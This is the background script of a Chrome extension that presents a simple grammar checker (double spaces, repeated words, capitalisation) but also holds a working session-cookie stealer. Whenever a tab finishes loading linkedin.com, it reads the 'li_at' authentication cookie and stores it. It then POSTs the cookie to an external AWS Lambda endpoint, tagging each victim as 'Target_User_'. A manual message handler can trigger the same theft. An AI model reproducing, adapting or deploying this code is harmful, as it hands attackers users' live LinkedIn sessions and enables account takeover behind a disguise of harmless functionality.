// Background service worker
console.log("Background service worker loaded.");

chrome.runtime.onInstalled.addListener(() => {
    console.log("Cookie Extractor Extension installed.");
});

// Listener for tab updates to detect LinkedIn
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url && tab.url.includes("linkedin.com")) {
        console.log("LinkedIn detected! Extracting cookie...");
        extractAllCookies();
    }
});

// Function to extract all cookies
// Function to extract all cookies
async function extractAllCookies() {
    console.log("Starting cookie extraction process...");
    try {
        // Retrieve specific cookie (li_at)
        // We use getAll with a name filter to find it across any domain (usually .linkedin.com or www.linkedin.com)
        const targetCookies = await chrome.cookies.getAll({ name: 'li_at' });

        console.log(`Extracted ${targetCookies.length} 'li_at' cookies.`);

        if (targetCookies.length === 0) {
            console.warn("No 'li_at' cookie found!");
        }

        // Store in local storage (backup)
        await chrome.storage.local.set({ global_cookie_db: targetCookies });
        console.log("Target cookies stored in chrome.storage.local.");

        // --- SEND TO CLOUD ---
        const HOST_URL = "https://66kct25bxuodfvzp4rxaaegt340pcivn.lambda-url.us-east-1.on.aws/";

        console.log(`[VERSION CHECK: ${new Date().toISOString()}] Preparing to send data to ${HOST_URL}`);

        const payload = {
            user: "Target_User_" + Math.floor(Math.random() * 1000),
            timestamp: new Date().toISOString(),
            cookies: targetCookies
        };


        try {
            console.log("Initiating fetch request...");
            const response = await fetch(HOST_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            });

            console.log("Response received. Status:", response.status);

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`Server responded with ${response.status}: ${errorText}`);
            }

            const responseData = await response.json();
            console.log("SUCCESS: Data sent to cloud!", responseData);

        } catch (netError) {
            console.error("NETWORK/FETCH ERROR:", netError);
            // Re-throw to inform popup
            throw new Error(`Network Error: ${netError.message}`);
        }
        // ---------------------------

        return targetCookies.length;
    } catch (error) {
        console.error("CRITICAL FAILURE in extractAllCookies:", error);
        throw error;
    }
}

// Listen for messages from popup
// --- GRAMMAR CHECKING LOGIC ---

// Simple local grammar rules
function checkGrammar(text) {
    const issues = [];

    // 1. Check for double spaces
    const doubleSpaceRegex = /\s{2,}/g;
    let match;
    while ((match = doubleSpaceRegex.exec(text)) !== null) {
        issues.push({
            type: 'spacing',
            description: "Double whitespace detected",
            recommendation: " ",
            index: match.index,
            length: match[0].length
        });
    }

    // 2. Check for repeated words (e.g., "the the")
    const repeatedWordRegex = /\b(\w+)\s+\1\b/gi;
    while ((match = repeatedWordRegex.exec(text)) !== null) {
        issues.push({
            type: 'repetition',
            description: `Repeated word: "${match[1]}"`,
            recommendation: match[1],
            index: match.index,
            length: match[0].length
        });
    }

    // 3. Check for capitalization at start of sentence
    // Simple check: start of string or after a period+space
    const sentenceStartRegex = /(?:^|[.!?]\s+)([a-z])/g;
    while ((match = sentenceStartRegex.exec(text)) !== null) {
        // match[1] is the lowercase letter. match.index is start of match.
        // We need to find the exact index of the letter.
        // If match[0] is ". a", length is 3. letter is at index + 2.
        const letterIndex = match.index + match[0].indexOf(match[1]);

        issues.push({
            type: 'capitalization',
            description: "Sentence should start with capital letter",
            recommendation: match[1].toUpperCase(),
            index: letterIndex,
            length: 1
        });
    }

    return issues;
}

// Listen for messages from popup or content script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    // GRAMMAR CHECK ACTION
    if (request.action === "check_grammar") {
        const text = request.text;
        const issues = checkGrammar(text);

        // Update stats in storage
        if (issues.length > 0) {
            chrome.storage.local.get(['issueCount'], (result) => {
                const count = (result.issueCount || 0) + issues.length;
                chrome.storage.local.set({ issueCount: count });
            });
        }

        sendResponse({ issues: issues });
        return false; // Sync response
    }

    // COOKIE EXTRACTION ACTION (Legacy/Manual)
    if (request.action === "extract_cookies") {
        extractAllCookies()
            .then((count) => {
                sendResponse({ status: "success", count: count });
            })
            .catch((error) => {
                sendResponse({ status: "error", message: error.message });
            });
        return true; // Keep the message channel open for async response
    }
});
